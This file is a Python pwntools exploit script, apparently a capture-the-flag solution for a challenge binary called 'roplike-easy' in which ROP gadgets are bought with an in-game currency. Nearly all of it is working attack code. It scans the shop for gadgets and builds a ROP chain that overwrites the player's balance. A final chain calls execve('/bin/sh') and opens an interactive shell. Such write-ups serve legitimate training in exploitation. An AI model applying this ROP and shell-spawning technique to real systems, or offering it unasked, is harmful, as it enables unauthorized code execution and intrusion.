from pwn import *

context.arch = 'amd64'
#context.log_level = 'DEBUG'

if args.REMOTE:
    io = remote("localhost", 49153)
else:
    io = process('./roplike-easy')

def buy(i):
    io.sendline(str(i).encode())

def rr():
    io.sendline(b'c')
    sleep(0.1)
    io.sendline()

def sendp(payload):
    io.sendline(b'c')
    sleep(0.1)
    io.sendline(payload)
    sleep(0.1)

gadget_base = 0x100000



# look for simple "pop r??; ret" gadgets that cost less than 2 roppis
# in the first shop; get the address of ret in the pop-ret gadget

print("\n[.] Attempting to get ret gadget in the first shop...\n")

ret = ''
while ret == '':
    io.recvuntil(b'gadgets:')
    io.recvline()
    # go through each item in the shop
    for i in range(5):
        line = io.recvline()
        target_in_menu = False
        for c in '9ABCEF':
            check = f'010000005{c}C3'.encode() # pop r??; ret
            if check in line:
                target_in_menu = True
                break
        if not target_in_menu:
            continue
        # pop ret gadget is in the menu; buy and move on
        buy(i)
        ret = p64(gadget_base + 5).hex() # [0~3]: price, [4]: pop, [5]: ret
        gadget_base += 0x1000 # one gadget in each page
        break
    if ret != '':
        break
    # not in menu, reconnect and try again
    io.close()
    sleep(1) # necessary, because srand is seeded by time (seconds)
    if args.REMOTE:
        io = remote("localhost", 49153)
    else:
        io = process('./roplike-easy')

rr()
print("\n[!] ret gadget acquired.\n")


# get enough roppis to buy necessary gadgets
# one round = 32 roppis max, so repeat 8 times which gives 256 roppis

print("\n[.] getting 256 roppis with ret gadget.", end='')

payload = ret * (0x200 // 16)
for _ in range(8):
    io.recvuntil(b'gadgets:')
    sendp(payload.encode())
    print('.', end='')
print("\n[!] Done.\n")


# buy necessary gadgets
gdict = {
        b'4801D8C3': "add rax, rbx",
        b'4883C304C3': "add rbx, 4",
        b'488900C3': "mov [rax], rax",
        b'4889E0C3': "mov rax, rsp",
        b'58C3': "pop rax",
        b'5BC3': "pop rbx",
        b'5AC3': "pop rdx",
        b'5FC3': "pop rdi",
        b'5EC3': "pop rsi",
        b'5053C3': "push rax; push rbx",
        b'48D1E3C3': "shl rbx, 1"
}
gadict = {}

print("\n[.] buying necessary gadgets to get enough roppis for syscall\n")
count = 0
rounds = 10
while count < len(gdict):
    print(f"[.] ROUND {rounds}, COUNT {count}")
    io.recvuntil(b'gadgets:')
    io.recvline()
    for i in range(5):
        io.recvuntil(b':')
        line = io.recvline().strip()[8:]
        for idx, g in enumerate(gdict):
            if g == line and gdict[g] not in gadict:
                print("[!] Buying: " + line.decode())
                buy(i)
                gadict[gdict[g]] = p64(gadget_base + 4).hex()
                gadget_base += 0x1000
                count += 1
                break
        if count >= len(gdict):
            break
    if count >= len(gdict):
        break
    rr()
    rounds += 1

print("\n[!] gadgets acquired.\n")

payload  = gadict["mov rax, rsp"]   # rax = rsp
payload += gadict["pop rbx"]
payload += p64(0).hex()             # rbx = 0
payload += gadict["add rbx, 4"]     # rbx = 4
payload += gadict["shl rbx, 1"] * 2 # rbx = 16
payload += gadict["add rbx, 4"]     # rbx = 20
payload += gadict["shl rbx, 1"] * 4 # rbx = 320
payload += gadict["add rbx, 4"]     # rbx = 324
payload += gadict["add rax, rbx"]   # rax = rsp + 324, address of balance
payload += gadict["mov [rax], rax"] # half the time this will be negative and won't work

sendp(payload.encode())

# check balance
# 2 of theserequired because 1 after gadget listing, 1 after buying
io.recvuntil(b"Funds available: ")
io.recvuntil(b"Funds available: ")

# this one's the updated fund
io.recvuntil(b"Funds available: ")
balance = int(io.recvline().strip())
if balance < 0:
    print(f"\n[-] Negative roppi balance ({balance}); exiting.")
    exit(255)
elif balance < 0xffffff:
    print(f"\n[-] Not enough roppi balance ({balance}); exiting.")
    exit(255)
print(f"\n[!] {balance} roppis acquired!\n")

rr()
rounds += 1

print("\n[.] Attempt to buy syscall and send full ropchain.\n")

syscall_bytes = b'48C7C03C0000000F05C3'
syscall = ''

while syscall == '':
    print(f"[.] ROUND {rounds}")
    io.recvuntil(b'gadgets:')
    io.recvline()
    for i in range(5):
        line = io.recvline().strip()
        if syscall_bytes in line:
            buy(i)
            # syscall part is the 11th byte of the given one
            syscall = p64(gadget_base + 11).hex()
            gadget_base += 0x1000
            break

    if syscall != '':
        break
    rr()
    rounds += 1


# execve("/bin/sh", 0, 0)
payload  = gadict["mov rax, rsp"]
payload += gadict["pop rbx"]
payload += p64(0).hex()
payload += gadict["add rbx, 4"] * 3
payload += gadict["shl rbx, 1"] * 2
payload += gadict["add rbx, 4"]
payload += gadict["shl rbx, 1"] * 4
payload += gadict["add rax, rbx"]
payload += gadict["pop rbx"]
payload += gadict["pop rdi"]
payload += gadict["push rax; push rbx"]
payload += gadict["pop rax"]
payload += p64(0x3b).hex()
payload += gadict["pop rsi"]
payload += p64(0).hex()
payload += gadict["pop rdx"]
payload += p64(0).hex()
payload += syscall

payload += ret * ((0x200 - len(payload)) // 16 - 1)
payload += "00000000/bin/sh\x00"

sendp(payload.encode())

io.interactive()
